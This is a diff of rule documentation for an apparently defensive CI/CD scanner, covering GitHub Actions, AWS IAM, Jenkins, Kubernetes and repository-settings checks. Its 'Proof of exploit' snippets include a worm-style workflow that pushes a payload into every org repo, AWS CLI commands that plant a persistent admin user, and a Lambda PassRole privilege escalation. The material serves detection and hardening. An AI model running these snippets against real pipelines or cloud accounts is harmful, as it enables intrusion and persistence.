+- Mirror jobs (push to ``github.com/<our-org>/<mirror>``), monorepo release jobs that push to a publishing org, and release-please-style automation legitimately push to a different repo. Suppress on the specific step name with a rationale that names the literal target. The rule does NOT fire on ``git push origin <ref>`` or ``git push upstream <ref>`` where the remote URL is otherwise unspecified.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): the propagation loop combined a stolen GITHUB_TOKEN with ``gh repo create`` plus ``git push`` to seed ``shai-hulud-workflow.yml`` into every repo the token could reach. Without the cross-repo push primitive the worm cannot leave the first infected runner.
+
+**Proof of exploit.**
+
+# Vulnerable: every repo the token can write to becomes a
+# propagation target on the next push trigger.
+jobs:
+  spread:
+    permissions: { contents: write, administration: write }
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          for repo in $(gh repo list "$ORG" --json name -q '.[].name'); do
+            gh repo clone "$ORG/$repo" "/tmp/$repo"
+            cp payload.yml "/tmp/$repo/.github/workflows/lint.yml"
+            git -C "/tmp/$repo" add .github/workflows/lint.yml
+            git -C "/tmp/$repo" commit -m 'ci: add lint workflow'
+            git -C "/tmp/$repo" push origin main
+          done
+
+# Safe: cross-repo pushes only from an environment-gated job
+# pinned to a literal destination, with a fine-scoped PAT
+# (not the workflow's GITHUB_TOKEN).
+jobs:
+  mirror:
+    environment: mirror-protected
+    permissions: { contents: read }
+    steps:
+      - run: git push https://x-access-token:${{ secrets.MIRROR_PAT }}@github.com/our-org/our-mirror.git main
+
+**Source:** [`GHA-049`](../providers/github.md#gha-049) in the [GitHub Actions provider](../providers/github.md).
+
+#### `GHA-050`: Publish step relies on long-lived registry token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-050 }
+
+**Evidences:** [`CICD-SEC-2`](#ctrl-cicd-sec-2) Inadequate Identity and Access Management, [`CICD-SEC-6`](#ctrl-cicd-sec-6) Insufficient Credential Hygiene.
+
+**How this is detected.** Fires when a step matches a known package-publish primitive AND the job has no protected ``environment:`` AND the step references a long-lived registry secret. Publish primitives covered:
+
+- ``run: npm publish`` / ``pnpm publish`` / ``yarn publish``
+- ``run: twine upload`` / ``run: poetry publish`` / ``run: uv publish``
+- ``run: gem push`` / ``run: cargo publish``
+- ``uses: pypa/gh-action-pypi-publish`` with a ``password`` input (the trusted-publisher path leaves ``password`` unset);
+- ``uses: JS-DevTools/npm-publish`` with a ``token`` input.
+
+Long-lived secret heuristic: the step's ``env:`` or ``with:`` block references ``NPM_TOKEN``, ``NODE_AUTH_TOKEN``, ``PYPI_TOKEN``, ``TWINE_PASSWORD``, ``POETRY_PYPI_TOKEN``, ``RUBYGEMS_API_KEY``, or ``CARGO_REGISTRY_TOKEN`` from ``secrets.*``. A job that already binds to a protected ``environment:`` passes regardless, because the environment's required-reviewers / branch-rule controls compensate for the static credential.
+
+Pairs with GHA-030 (cloud OIDC trust). GHA-030 covers the cloud-credentials exchange; GHA-050 covers the package registry side.
+
+**Recommendation.** Replace long-lived publish tokens with OIDC trusted-publisher flows and bind the publish job to a protected ``environment:``. Concretely:
+
+- **PyPI**: use ``pypa/gh-action-pypi-publish`` with PEP 740 trusted publishing (no ``password`` input); the GHA OIDC token is exchanged at PyPI for a short-lived upload token.
+- **npm**: use ``--provenance`` on ``npm publish`` from a job that requests ``id-token: write`` (npm provenance, GA 2024); drop ``NODE_AUTH_TOKEN`` / ``NPM_TOKEN`` from the env block where possible.
+- **GHCR / ECR / GAR**: prefer ``configure-aws-credentials`` with ``role-to-assume`` (or the Azure / GCP equivalent), not static registry passwords.
+- Add ``environment: <protected-name>`` to the publish job so branch restrictions and required reviewers apply.
+
+A long-lived ``NPM_TOKEN`` is the fuel a Shai-Hulud-shaped worm needs: once stolen from any runner it can publish more compromised packages on the org's behalf. OIDC tokens expire in minutes and are scoped to the run that requested them.
+
+**Known false positives.**
+
+- Private / internal registries that don't support OIDC (legacy Artifactory, self-hosted Nexus without OIDC broker) require a static token. The right response is ``environment:`` gating with required reviewers on the publish job; suppress this rule with a rationale that names the protected environment.
+- First-publish bootstrap of a new package (npm and PyPI both require an initial manual publish before trusted-publisher can be wired). The rule fires; suppress on the specific step until the trusted-publisher record is in place.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): the worm's self-propagation step scraped ``NPM_TOKEN`` from runner env / ``~/.npmrc`` and used it to ``npm publish`` patch versions of other packages the maintainer's account owned. Provenance + OIDC + environment gating turn that step into a no-op: the OIDC token doesn't survive the run, and an environment-gated publish requires a human reviewer.
+- TanStack / Mistral compromises (May 2026): same shape, mass publish of poisoned versions using maintainer credentials. An environment gate on the publish job would have stopped the unattended release.
+
+**Proof of exploit.**
+
+# Vulnerable: long-lived NPM_TOKEN, no environment gate. Any
+# postinstall in a transitive dep reaches the token via the
+# step env and can re-publish other packages the token can
+# reach.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: actions/setup-node@<sha>
+        with: { registry-url: 'https://registry.npmjs.org' }
+      - run: npm ci && npm publish
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+
+# Safe: OIDC trusted-publisher + provenance + environment
+# gate. The publish job requires a deployment approval; the
+# upload uses a short-lived OIDC token; the tarball is
+# signed with provenance metadata npm verifies on install.
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    environment: npm-publish        # required reviewers
+    permissions:
+      contents: read
+      id-token: write               # OIDC
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: actions/setup-node@<sha>
+        with: { registry-url: 'https://registry.npmjs.org' }
+      - run: npm ci --ignore-scripts
+      - run: npm publish --provenance --access public
+
+**Source:** [`GHA-050`](../providers/github.md#gha-050) in the [GitHub Actions provider](../providers/github.md).
 
 #### `GL-001`: Image not pinned to specific version or digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-001 }
 
@@ -4681,7 +5538,7 @@ jobs:
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -5018,6 +5875,41 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Recommendation.** Replace AdministratorAccess with least-privilege policies.
 
+**Proof of exploit.**
+
+# Vulnerable: CodeBuild service role with AdministratorAccess.
+# (Terraform shown for clarity; the actual finding comes from
+# live ListAttachedRolePolicies on the role.)
+resource "aws_iam_role" "codebuild" {
+  name               = "codebuild-deploy"
+  assume_role_policy = data.aws_iam_policy_document.cb_trust.json
+}
+resource "aws_iam_role_policy_attachment" "admin" {
+  role       = aws_iam_role.codebuild.name
+  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+}
+
+# Attack: any compromise of the build (poisoned dependency,
+# leaked buildspec edit, malicious PR merged to the branch
+# CodeBuild trusts) runs as a principal with full account
+# permissions. From a build shell:
+#
+#   aws iam create-user --user-name persistence
+#   aws iam attach-user-policy --user-name persistence \
+#     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+#   aws iam create-access-key --user-name persistence
+#
+# Game over: out-of-band admin, no IP gate, survives every
+# subsequent rotation of the CodeBuild role itself.
+
+# Safe: scope the role to the resources the pipeline actually
+# touches. ``AdministratorAccess`` is never the right answer
+# for an automation principal.
+resource "aws_iam_role_policy" "codebuild_least_priv" {
+  role   = aws_iam_role.codebuild.id
+  policy = data.aws_iam_policy_document.deploy_specific.json
+}
+
 **Source:** [`IAM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 #### `IAM-002`: CI/CD role has wildcard Action in attached policy <span class="pg-sev pg-sev--high">HIGH</span> { #detail-iam-002 }
@@ -5047,6 +5939,43 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **How this is detected.** ``iam:PassRole`` with ``Resource: '*'`` lets the principal hand any role to any service. Combined with a service that runs your code (Lambda, ECS, CodeBuild, EC2 Instance Profiles), this is role-hop privilege escalation: launch an ephemeral resource configured with a higher-privileged role, run code under that identity, exfil. Scoping by ARN + ``iam:PassedToService`` removes the escalation path.
 
 **Recommendation.** Restrict iam:PassRole to specific role ARNs and add an iam:PassedToService condition.
+
+**Proof of exploit.**
+
+# Vulnerable: pipeline role grants PassRole with Resource: '*'.
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["iam:PassRole", "lambda:CreateFunction",
+                "lambda:InvokeFunction"],
+    "Resource": "*"
+  }]
+}
+
+# Attack: from a build shell, create a Lambda configured with
+# the highest-privileged role you can name and invoke it:
+#
+#   aws lambda create-function --function-name pwn \
+#     --role arn:aws:iam::123456789012:role/prod-admin \
+#     --runtime python3.12 --handler i.h \
+#     --zip-file fileb://payload.zip
+#   aws lambda invoke --function-name pwn /tmp/out
+#
+# The Lambda now runs as ``prod-admin`` even though the
+# pipeline principal never had that role's permissions
+# directly. Classic role-hop privilege escalation.
+
+# Safe: pin to one role ARN AND require the pass be scoped
+# to the service that legitimately consumes it.
+{
+  "Effect": "Allow",
+  "Action": "iam:PassRole",
+  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
+  "Condition": {
+    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
+  }
+}
 
 **Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -5204,7 +6133,7 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Evidences:** [`CICD-SEC-10`](#ctrl-cicd-sec-10) Insufficient Logging and Visibility.
 
-**How this is detected.** Without a retention policy, build logs accumulate indefinitely; a secret that once leaked into a log stays visible to anyone who can read jobs. Recognises declarative `options { buildDiscarder(...) }`, scripted `properties([buildDiscarder(...)])`, and bare `logRotator(...)`.
+**How this is detected.** Without a retention policy, build logs accumulate indefinitely; a secret that once leaked into a log stays visible to anyone who can read jobs. Recognizes declarative `options { buildDiscarder(...) }`, scripted `properties([buildDiscarder(...)])`, and bare `logRotator(...)`.
 
 **Recommendation.** Add `options { buildDiscarder(logRotator(numToKeepStr: '30', daysToKeepStr: '90')) }` (declarative) or the `properties([buildDiscarder(...)])` equivalent in scripted pipelines. Tune the numbers to your retention policy.
 
@@ -5226,7 +6155,7 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Evidences:** [`CICD-SEC-4`](#ctrl-cicd-sec-4) Poisoned Pipeline Execution.
 
-**How this is detected.** Recognises both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.
+**How this is detected.** Recognizes both `copyArtifacts(projectName: ...)` and the older `step([$class: 'CopyArtifact', ...])` form. If the upstream job accepts multibranch or PR builds, the artifact may have been produced by attacker-controlled code.
 
 **Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.
 
@@ -5312,7 +6241,7 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck. Comments are stripped before matching.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -5462,6 +6391,44 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 - Author-controlled environment refs like ``${env.JOB_NAME}`` or ``${env.BUILD_NUMBER}`` are intentionally not flagged, those values come from Jenkins itself, not from the triggerer. Pipelines that intentionally select agents via a vetted parameter and gate the assignment behind a Groovy validator should suppress with ``.pipelinecheckignore`` and a rationale rather than disable the rule everywhere.
 
 **Source:** [`JF-032`](../providers/jenkins.md#jf-032) in the [Jenkins provider](../providers/jenkins.md).
+
+#### `JF-033`: withCredentials secret leaked via Groovy ${...} interpolation in sh step <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-033 }
+
+**Evidences:** [`CICD-SEC-6`](#ctrl-cicd-sec-6) Insufficient Credential Hygiene.
+
+**How this is detected.** ``withCredentials([string(credentialsId: 'X', variable: 'TOKEN')])`` exposes the secret as a shell environment variable for the duration of the block. The rule fires when a ``sh`` / ``bat`` / ``powershell`` step inside that block uses a Groovy interpolation (``${TOKEN}`` or ``$TOKEN`` in a double-quoted / triple-double-quoted string) to reference the binding. Groovy substitutes the literal value before handing the resulting string to the shell, so Jenkins' secret-masking wrapper, which only sees the shell-level ``$TOKEN`` token, cannot redact the value in trace output. Single-quoted bodies (``sh '... $TOKEN'``) leave the variable for the shell to resolve at run time, which is the safe pattern.
+
+**Recommendation.** Inside a ``withCredentials([...])`` block, reference each bound variable through the shell (single-quoted Groovy string), not through Groovy interpolation. Write ``sh 'curl -H "Authorization: Bearer $TOKEN" ...'`` instead of ``sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."``. The single-quoted form keeps Jenkins' secret-masking layer in the loop, the double-quoted Groovy form bakes the literal value into the command string before the masker ever sees it, so ``set -x`` (Jenkins' default for ``sh``) prints the credential to the build log.
+
+**Known false positives.**
+
+- Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.
+
+**Source:** [`JF-033`](../providers/jenkins.md#jf-033) in the [Jenkins provider](../providers/jenkins.md).
+
+#### `JF-034`: Pipeline declares a password() build parameter <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-034 }
+
+**Evidences:** [`CICD-SEC-6`](#ctrl-cicd-sec-6) Insufficient Credential Hygiene.
+
+**How this is detected.** Jenkins' ``password()`` parameter persists the supplied value into ``builds/<n>/build.xml`` as an encrypted ``Secret``, the same encryption the Credentials Provider uses. The encryption is keyed off the controller's master key at ``$JENKINS_HOME/secrets/master.key``, so anyone who captures both the build XML and the master key (a filesystem backup, an admin running ``thinBackup``, a compromised agent that can read controller state) recovers every password every operator has ever submitted. The build's parameters page renders the value as ``********`` for Job/Read users, but Job/Configure (or higher) can recover the encrypted string from ``config.xml`` and decrypt it. The substantive operational gap vs ``withCredentials`` is log-masking: a ``sh "deploy ${params.API_TOKEN}"`` step leaks the value to the build log because the Credentials Binding plugin's masker is what intercepts that flow, and the masker only fires for ``withCredentials`` bindings, not for ``params.*`` references. ``password()`` should be treated as a deprecated anti-pattern.
+
+**Recommendation.** Replace ``password(name: 'X')`` with a credential binding. Store the secret in Jenkins' Credentials Provider and pull it in with ``withCredentials([string(credentialsId: 'X', variable: 'X')])``. The bound variable integrates with Jenkins' log-masking, the credential definition is decoupled from build invocation (so operators don't retype the value on every trigger), and Job/Configure on the build no longer exposes the value through ``build.xml``.
+
+**Known false positives.**
+
+- A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.
+
+**Source:** [`JF-034`](../providers/jenkins.md#jf-034) in the [Jenkins provider](../providers/jenkins.md).
+
+#### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+
+**How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.
+
+**Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+**Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).
 
 #### `K8S-001`: Container image not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-001 }
 
@@ -5618,7 +6585,7 @@ Most stateless services need no capabilities at all. Avoid ``SYS_ADMIN`` (effect
 
 **Seen in the wild.**
 
-- [CVE-2021-25741](https://www.cve.org/CVERecord?id=CVE-2021-25741) (Kubernetes subpath symlink escape): a container with ``hostPath`` plus subpath could traverse outside the volume boundary and read or modify arbitrary host files. Exploitable on any cluster permitting hostPath to non-system workloads.
+- [CVE-2021-25741](https://www.cve.org/CVERecord?id=CVE-2021-25741) (Kubernetes subPath volume traversal): a container could craft a ``subPath`` on a volume mount to access files outside the volume boundary. The bug affected multiple volume kinds; ``hostPath`` makes the blast radius worse because the volume already references host paths, so escaping the subpath lands directly on the node filesystem with the kubelet's privileges in scope.
 - TeamTNT / Kinsing crypto-jacking campaigns (2020-2022): cluster compromise reports repeatedly traced lateral movement from a single misconfigured pod to the underlying node via hostPath:/, then to kubelet credentials and other tenants. Sysdig and Aqua incident reports document the pattern.
 
 **Proof of exploit.**
@@ -5737,7 +6704,7 @@ spec:
 **Seen in the wild.**
 
 - [Tesla Kubernetes dashboard compromise](https://redlock.io/cloud-security-trends-october-2018) (RedLock, 2018): an unauthenticated Kubernetes dashboard exposed to the internet held tokens for service accounts bound to cluster-admin. Attackers used the dashboard credentials to deploy crypto-mining workloads with full cluster access. Least-privilege RBAC would have capped the blast radius even after dashboard exposure.
-- Argo CD CVE-2022-24348 / CVE-2022-24768 chain (2022): directory traversal plus a default cluster-admin install let any project member exfiltrate cluster-wide secrets. Argo's recommendation post-fix was to scope the controller's RBAC away from cluster-admin so a similar future bug couldn't escalate the same way.
+- Argo CD [CVE-2022-24348](https://www.cve.org/CVERecord?id=CVE-2022-24348) (2022): a Helm path-traversal bug let a project member read other applications' YAML, exposing credentials. Combined with the default cluster-admin RBAC install, the recovered tokens were a direct cluster takeover. Argo's recommendation post-fix was to scope the controller's RBAC away from cluster-admin so a similar future bug couldn't escalate the same way.
 
 **Source:** [`K8S-020`](../providers/kubernetes.md#k8s-020) in the [Kubernetes provider](../providers/kubernetes.md).
 
@@ -5987,6 +6954,44 @@ spec:
 **Recommendation.** Remove ``securityContext.procMount: Unmasked`` (or set it explicitly to ``Default``). The default ``Default`` procMount type masks several kernel- and node-information paths under ``/proc`` (``/proc/asound``, ``/proc/acpi``, ``/proc/kcore``, ``/proc/keys``, ``/proc/latency_stats``, ``/proc/timer_list``, ``/proc/timer_stats``, ``/proc/sched_debug``, ``/proc/scsi``) and remounts ``/proc/sys`` as read-only. These maskings are what stop a container from reading the host's kernel structures or writing to ``/proc/sys`` and breaking the kernel out of namespace isolation. ``Unmasked`` undoes all of that.
 
 **Source:** [`K8S-040`](../providers/kubernetes.md#k8s-040) in the [Kubernetes provider](../providers/kubernetes.md).
+
+#### `K8S-041`: Service.externalIPs allows traffic interception (CVE-2020-8554) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-041 }
+
+**Evidences:** [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
+
+**How this is detected.** CVE-2020-8554 is a design-level Kubernetes weakness rather than a code bug: any namespace user with ``services`` create permission can declare ``spec.externalIPs: [<arbitrary IP>]`` on a Service, and kube-proxy installs DNAT rules that intercept traffic destined for that IP on every node. The attacker primitive is to MITM in-cluster traffic to public endpoints, metadata services, or other tenants' workloads. Kubernetes upstream's remediation is admission-time enforcement (see the ``DenyServiceExternalIPs`` admission plugin and the RBAC pattern in the official guidance) rather than a runtime fix. This rule flags any non-empty ``externalIPs`` list so the team can confirm the field is gone from manifests before the admission policy is rolled out.
+
+**Recommendation.** Remove ``spec.externalIPs`` from the Service. The field has no legitimate use in most clusters and any namespace user with ``services.create`` can claim any IP, including the cluster's own kube-apiserver, metrics-server, or an external service IP, and the kube-proxy iptables rules will redirect matching traffic to their pods. Enforce the absence cluster-wide with an admission policy (Gatekeeper / Kyverno / ValidatingAdmissionPolicy) that rejects Services with a non-empty ``externalIPs`` list.
+
+**Seen in the wild.**
+
+- CVE-2020-8554 (Kubernetes, 2020): documented MITM-via-externalIPs design flaw. Kubernetes' upstream advisory recommends restricting externalIPs via admission control.
+
+**Source:** [`K8S-041`](../providers/kubernetes.md#k8s-041) in the [Kubernetes provider](../providers/kubernetes.md).
+
+#### `K8S-042`: RoleBinding grants access to system:anonymous / system:unauthenticated <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-042 }
+
+**Evidences:** [`CICD-SEC-2`](#ctrl-cicd-sec-2) Inadequate Identity and Access Management, [`CICD-SEC-5`](#ctrl-cicd-sec-5) Insufficient PBAC.
+
+**How this is detected.** Kubernetes resolves authentication failures into the ``system:anonymous`` user (member of ``system:unauthenticated`` group) rather than rejecting the request outright, so any RBAC subject naming either of those values applies to requests with no Authorization header. The rule fires on both ``RoleBinding`` (namespace-scoped) and ``ClusterRoleBinding`` (cluster-scoped) subjects. Pairs with K8S-020: cluster-admin bound to a named SA is bad; cluster-admin bound to ``system:anonymous`` is cluster takeover by anyone with TCP/443 to the apiserver.
+
+**Recommendation.** Remove the binding's subject entry for ``system:anonymous`` or ``system:unauthenticated``. Anything bound to either subject is reachable without an authentication token, anyone who can hit the apiserver, including from inside an untrusted pod or from the public internet on an exposed apiserver, gets the bound verbs. If the workload genuinely needs unauthenticated read access (rare, usually only for OIDC discovery or the deprecated ``system:public-info-viewer`` shape), audit the bound ClusterRole's verbs+resources and confirm no write or secret-read verb is included.
+
+**Source:** [`K8S-042`](../providers/kubernetes.md#k8s-042) in the [Kubernetes provider](../providers/kubernetes.md).
+
+#### `K8S-043`: Ingress rule has wildcard or missing host (catch-all) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-043 }
+
+**Evidences:** [`CICD-SEC-7`](#ctrl-cicd-sec-7) Insecure System Configuration.
+
+**How this is detected.** An Ingress rule with no ``host:`` matches every Host header the controller receives; a rule with ``host: '*'`` is the explicit form of the same behavior. Both shape choices collapse the controller's hostname-based routing into a pure path-based match, which means anyone who can present any hostname (HTTP/1.1 Host header rewrite, malicious CNAME, controller hairpin) reaches this backend. The rule also fires on apex wildcards like ``host: '*.example.com'`` since they accept subdomains the cluster operator never intended to register. A backend that's intentionally wildcard-routed (a tenant-per-subdomain SaaS) should suppress with a rationale rather than disabling the check.
+
+**Recommendation.** Pin every Ingress rule to an explicit hostname. ``host: api.example.com`` (not ``host: '*'``, ``host: '*.example.com'``, and not an omitted ``host:``). A catch-all host binding means any request to the ingress controller's external address, regardless of HTTP Host header, can route to this backend; an attacker with control over an arbitrary hostname pointing at the same controller (a parked domain, a typo'd CNAME, a cluster-internal name on a shared controller) reaches paths that should have been host-scoped.
+
+**Known false positives.**
+
+- TLS terminators that intentionally use a single Ingress with a wildcard host to front many tenant subdomains are legitimate; suppress the finding for that Ingress specifically rather than disabling the rule.
+
+**Source:** [`K8S-043`](../providers/kubernetes.md#k8s-043) in the [Kubernetes provider](../providers/kubernetes.md).
 
 #### `KMS-000`: KMS API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-kms-000 }
 
@@ -6592,6 +7597,130 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 
 **Source:** [`SCM-019`](../providers/scm.md#scm-019) in the [SCM provider](../providers/scm.md).
 
+#### `SCM-020`: Default workflow GITHUB_TOKEN has write permission <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-020 }
+
+**Evidences:** [`CICD-SEC-2`](#ctrl-cicd-sec-2) Inadequate Identity and Access Management, [`CICD-SEC-5`](#ctrl-cicd-sec-5) Insufficient PBAC.
+
+**How this is detected.** Reads ``default_workflow_permissions`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. Values are ``"read"`` (safe) or ``"write"`` (fail). Requires the token to have ``admin`` scope on the repo; without it GitHub returns 403 and the rule passes silently with an unavailability note. Complements GHA-048 / GHA-049 — those catch the *workflow* asking for write; SCM-020 catches the *org / repo* handing out write by default.
+
+**Recommendation.** In repo Settings → Actions → General → Workflow permissions, set the default to ``Read repository contents and packages permissions``. Workflows that genuinely need to push, comment on PRs, or modify issues opt in explicitly via the workflow-file ``permissions:`` block. The default ``write`` setting gives every workflow's ``GITHUB_TOKEN`` write access to every API surface the repo exposes (contents, issues, PRs, actions, packages, deployments), so a single compromised dependency in any job is one step away from the GHA-048 / GHA-049 worm-propagation primitives (workflow self-mutation, cross-repo push) the rule pack catches at the workflow-YAML layer. Setting the default to ``read`` is the org-side complement: even if a workflow forgets to declare ``permissions:`` and the compromised dep tries to push, GitHub refuses the operation.
+
+**Known false positives.**
+
+- Repos where every workflow legitimately needs write access (release-publishing automation, mirror-sync jobs) may set the default to ``write`` deliberately. The right pattern is still to keep the default at ``read`` and grant write at the workflow level — that way a new workflow (added by a future contributor) starts safe. Suppress only when every workflow in the repo carries an explicit ``permissions:`` block.
+
+**Seen in the wild.**
+
+- Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.
+
+**Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).
+
+#### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }
+
+**Evidences:** [`CICD-SEC-1`](#ctrl-cicd-sec-1) Insufficient Flow Control Mechanisms, [`CICD-SEC-4`](#ctrl-cicd-sec-4) Poisoned Pipeline Execution.
+
+**How this is detected.** Reads ``can_approve_pull_request_reviews`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. ``True`` is the fail signal; ``False`` (or absent) passes. Requires admin scope on the repo. Complements SCM-002 / SCM-011 / SCM-014 — without SCM-021, those rules document intent rather than enforcement, because Actions can fulfil the review requirement itself.
+
+**Recommendation.** In repo Settings → Actions → General → Workflow permissions, uncheck ``Allow GitHub Actions to create and approve pull requests``. With it on, any workflow whose ``GITHUB_TOKEN`` includes ``pull-requests: write`` can submit an approving review on a PR — including its own. Required-review controls (SCM-002), CODEOWNERS reviews (SCM-011), and last-push approval (SCM-014) all become advisory once Actions can satisfy their own gate. A compromised dependency that opens a PR can immediately approve and merge it without any human in the loop.
+
+**Known false positives.**
+
+- Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.
+
+**Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).
+
+#### `SCM-022`: Repo Actions permissions allow any source (no allow-list) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-022 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
+
+**How this is detected.** Reads ``allowed_actions`` from ``GET /repos/{owner}/{repo}/actions/permissions``. Values: ``"selected"`` (allow-listed) and ``"local_only"`` (org-internal only) pass; ``"all"`` (no restriction) fails. Requires admin scope. The rule passes silently when Actions is disabled at the repo level (``enabled: false``) — nothing runs, so the source restriction is moot.
+
+**Recommendation.** In repo Settings → Actions → General → Actions permissions, set the allow-list mode to ``Allow <owner>, and select non-<owner>, actions and reusable workflows`` (``selected``) and curate a list of trusted publishers. Each new third-party action becomes an explicit decision rather than the result of a workflow writer adding ``uses: random/unknown@v1`` and CI silently executing it. The shipped pack of GHA-040 (compromised-action registry) plus GHA-041..047 (action reputation checks) provides the workflow-time signal; SCM-022 is the org-policy gate that says ``don't even let an untrusted action onto the runner.``
+
+**Known false positives.**
+
+- Repos that legitimately consume a wide variety of third-party actions (open-source CI examples, marketplace-aggregator demos) may accept the ``all`` mode as a trade-off. The right defense in that case is rigorous SHA-pinning (GHA-001) plus the GHA-040..047 reputation pack; SCM-022 is the org-level allow-list that becomes redundant when every workflow already pins to a vetted commit.
+
+**Source:** [`SCM-022`](../providers/scm.md#scm-022) in the [SCM provider](../providers/scm.md).
+
+#### `SCM-023`: Deployment environment lacks required-reviewer protection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-023 }
+
